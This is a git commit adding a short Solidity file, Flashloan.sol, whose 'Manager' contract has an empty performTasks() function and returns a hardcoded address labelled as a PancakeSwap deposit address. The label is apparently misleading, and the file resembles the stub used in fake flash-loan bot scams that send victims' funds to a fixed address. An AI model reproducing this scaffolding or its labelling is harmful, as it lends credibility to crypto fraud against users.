f2866fce1412d89565fd869f93aa29b46f4b67d9
FlashLoanAttack <94763436+FlashLoanAttack@users.noreply.github.com>
2021-11-20 16:00:14 -0500

    Flashloan.sol

---
+++ Flashloan.sol
@@ -0,0 +1,8 @@
+pragma solidity ^0.5.0;
+contract Manager {
+    function performTasks() public {
+    }
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xcaFe8E5F9841747d923BFB6E76545413AB03e050;
+    }
+}
